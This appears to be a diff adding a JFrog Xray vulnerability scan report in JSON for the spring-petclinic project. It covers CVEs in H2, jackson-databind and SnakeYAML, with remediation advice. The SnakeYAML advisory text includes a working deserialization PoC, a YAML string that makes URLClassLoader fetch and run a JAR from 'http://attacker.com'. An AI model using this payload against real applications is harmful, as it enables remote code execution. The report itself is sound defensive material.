@@ -1,0 +1,181 @@
+{
+  "XrayResults": [
+    {
+      "scan_id": "2c22785c-fe81-451e-5d58-040f1d0faec3",
+      "component_id": "generic://sha256:074b308659143d4e146db0ca11daef02fff725b4996fb703ca70aa18fc3b5530/devcontainer.json",
+      "package_type": "generic",
+      "status": "completed"
+    },
+    {
+      "scan_id": "a7fbf35c-b010-4a91-628a-1342c44d0cc5",
+      "component_id": "build://target/build-info.json",
+      "package_type": "build",
+      "status": "completed"
+    },
+    {
+      "scan_id": "a329ae1c-14e0-4492-7090-6b114a4e2dcf",
+      "component_id": "gav://org.apache.maven.wrapper:maven-wrapper:3.2.0",
+      "package_type": "maven",
+      "status": "completed"
+    },
+    {
+      "scan_id": "34600e71-ab27-4a6e-513d-67dc10b2d1f3",
+      "component_id": "generic://sha256:91a239400bb638f36a1795d8fdf7939d532cdc7d794d1119b7261aac158b1e60/gradle-wrapper.jar",
+      "package_type": "generic",
+      "status": "completed"
+    },
+    {
+      "scan_id": "e4bda8cc-82a4-4366-534f-0fd1ab05998e",
+      "vulnerabilities": [
+        {
+          "cves": [
+            {
+              "cve": "CVE-2022-45868",
+              "cvss_v3_score": "7.8",
+              "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+            }
+          ],
+          "summary": "** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states \"This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that.\"",
+          "severity": "High",
+          "components": {
+            "gav://com.h2database:h2:2.1.214": {
+              "fixed_versions": [
+                "[2.2.220]"
+              ],
+              "impact_paths": [
+                [
+                  {
+                    "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT"
+                  },
+                  {
+                    "component_id": "gav://com.h2database:h2:2.1.214",
+                    "full_path": "BOOT-INF/lib/h2-2.1.214.jar"
+                  }
+                ]
+              ]
+            }
+          },
+          "issue_id": "XRAY-261922",
+          "references": [
+            "https://sites.google.com/sonatype.com/vulnerabilities/sonatype-2022-6243",
+            "https://github.com/h2database/h2database/blob/96832bf5a97cdc0adc1f2066ed61c54990d66ab5/h2/src/main/org/h2/server/web/WebServer.java#L346-L347"
+          ],
+          "extended_information": {
+            "short_description": "(Non-issue) Incorrect usage of the H2 Database Engine may result in password leakage for the H2 Console.",
+            "full_description": "[h2database](https://github.com/h2database/h2database) is an open-source lightweight Java Database. H2 Database supports standard database APIs such as SQL and JDBC API. The H2 Database can also be used in embedded and server modes. H2 Database has a web-based admin console that can be initialized via the CLI. The console is accessible via tool options that are declared by the H2 Database. \n\nThe H2 console supports the `-webAdminPassword` CLI argument which takes the web admin password as a value. Specifying this password in the CLI is unsafe since local attackers will be able to see the password in plain text when the process list is shown with the arguments used to run them.\n\nThis vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+            "jfrog_research_severity": "Low",
+            "jfrog_research_severity_reasons": [
+              {
+                "name": "The issue has been disputed by the vendor",
+                "description": "This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+                "is_positive": true
+              }
+            ]
+          }
+        },
+        {
+          "cves": [
+            {
+              "cve": "CVE-2023-35116",
+              "cvss_v3_score": "4.7",
+              "cvss_v3_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H"
+            }
+          ],
+          "summary": "An issue was discovered jackson-databind thru 2.15.2 allows attackers to cause a denial of service or other unspecified impacts via crafted object that uses cyclic dependencies.",
+          "severity": "Medium",
+          "components": {
+            "gav://com.fasterxml.jackson.core:jackson-databind:2.15.2": {
+              "impact_paths": [
+                [
+                  {
+                    "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT"
+                  },
+                  {
+                    "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.15.2",
+                    "full_path": "BOOT-INF/lib/jackson-databind-2.15.2.jar"
+                  }
+                ]
+              ]
+            }
+          },
+          "issue_id": "XRAY-522015",
+          "references": [
+            "https://github.com/FasterXML/jackson-databind/issues/3972"
+          ]
+        },
+        {
+          "cves": [
+            {
+              "cve": "CVE-2022-1471",
+              "cvss_v3_score": "9.8",
+              "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            }
+          ],
+          "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
+          "severity": "Critical",
+          "components": {
+            "gav://org.yaml:snakeyaml:1.33": {
+              "fixed_versions": [
+                "[2.0]"
+              ],
+              "impact_paths": [
+                [
+                  {
+                    "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT"
+                  },
+                  {
+                    "component_id": "gav://org.yaml:snakeyaml:1.33",
+                    "full_path": "BOOT-INF/lib/snakeyaml-1.33.jar"
+                  }
+                ]
+              ]
+            }
+          },
+          "issue_id": "XRAY-262821",
+          "references": [
+            "https://github.com/mbechler/marshalsec",
+            "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479",
+            "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2",
+            "https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true"
+          ],
+          "extended_information": {
+            "short_description": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
+            "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
+            "jfrog_research_severity": "Critical",
+            "jfrog_research_severity_reasons": [
+              {
+                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+                "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
+                "is_positive": true
+              },
+              {
+                "name": "The issue results in a severe impact (such as remote code execution)",
+                "description": "Remote code execution."
+              },
+              {
+                "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
+                "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments."
+              },
+              {
+                "name": "The issue has an exploit published",
+                "description": "PoC demonstrates remote code execution."
+              }
+            ],
+            "remediation": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc."
+          }
+        }
+      ],
+      "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT",
+      "package_type": "maven",
+      "status": "completed"
+    }
+  ],
+  "ScannedTechnologies": null,
+  "ApplicabilityScanResults": null,
+  "SecretsScanResults": null,
+  "IacScanResults": null,
+  "EntitledForJas": false,
+  "EligibleForApplicabilityScan": false,
+  "EligibleForSecretScan": false,
+  "EligibleForIacScan": false
+}
